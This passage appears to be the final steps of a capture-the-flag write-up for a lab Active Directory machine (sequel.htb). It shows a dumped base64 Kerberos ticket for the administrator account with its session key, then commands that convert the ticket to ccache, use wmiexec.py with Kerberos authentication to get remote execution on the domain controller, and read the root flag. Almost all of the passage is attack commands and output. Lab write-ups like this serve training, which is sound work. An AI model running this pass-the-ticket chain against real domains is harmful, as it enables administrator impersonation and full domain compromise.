DqO0WB+NMQnI6G6BDsTCbAYKC9CrZNVwCvZS5ebjHbY+uZ17KVxaZo1ShpDfynLvAReHO8kUKOedr6z7W67Ndfd9+Sp1ou43yTQA+XJc13bbGiYkVvWUItIhVHZG3zHQw9y+bqBzEXnVxZSMbzM75RXerNm3W311BH2IifNO89w8a9t6h7JR3fUqGORLhJsuvi4xftXDjSUr6tvqlRCQ+YRMryks0/zelOt8sbfJ8pGQBveIS8K/7qMIc6JVCNKUIvaBQuiiiNrESLZZy0rOJVScRM27QCadiGK/v1sQVEVPgfn1OkP1xDYTc6JFwkLquHRBR8f211wAYZkSALLYxtEitBckKrRYaVOMd+Doxx1itEQsG87FSxEHAJL42ZS/WHG5/jStsD7NlJsBXgbGXmh6qwd8O8NJZijlaSIzqmOgN/AoFxEJLk281/LvAbJyIRjQwBe6VilHP2BnT3aDouAO9pBfZh2+w/7WqQvI574ilcaIQyir4c+7HqKx5pLQfXhfXlidGBngpXOrGCbJFTiwhHRpMM4MMVCbGqKNr8baZvtIcFQ2rPdmpmqT8ErITDkaauW7Xgx/8eJwOHxVfNI8YprlRi6p1qtTrSB+C8Ynp0kptudc15BxAH3Fgf9xQNIR+47w2tbBkbAB16EfzW5Joo3XqYjwj7nQs5nLjVPA/kEn4ZR+bgvPCi5iEiRM0utkAWwMzM05TTkkqPRemXuRtnrGCCX7czvXH7wN4l9JJmOZ+f2R0j35Z6OVfJi0aZOUw0lgK6Uns0heHD9K6cU6eUTxA1b8C1pUGqUHBvc7EEHYD+ozoICiLjmtKN69AHbwIMO0HJu1/8FraFZvS7hkQKvhOo2JBM8wYHWTvPlfTf61G99D3n/T5/s8YfMuv8K4LUVuZ2j64xWR32p0nU6fXv622vO0agBNOq9Prshds6BDfKOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEEM+evox4soxAniRXHZIygFKhDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyNTA5MDMxOTQ4MjdaphEYDzIwMjUwOTA0MDU0ODI3WqcRGA8yMDI1MDkxMDE5NDgyN1qoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  9/3/2025 12:48:27 PM
  EndTime                  :  9/3/2025 10:48:27 PM
  RenewTill                :  9/10/2025 12:48:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  z56+jHiyjECeJFcdkjKAUg==
  ASREP (key)              :  561A0629C47EE7F4ACE7C760CAA32227
```

Create a ccache ticket in the attacker machine. Paste the content of the ticket to administrator.kirbi.b64 file.

Decode it from b64 to kirbi:

```bash
base64 -d administrator.kirbi.b64 > administrator.kirbi
```

Convert it to ccache:

```bash
ticketConverter.py administrator.kirbi administrator.ccache
```

Use it:

```
export KRB5CCNAME=$(pwd)/administrator.ccache
wmiexec.py -k -no-pass sequel.htb/administrator@DC01.sequel.htb -dc-ip 10.129.232.128
```

Print the flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```
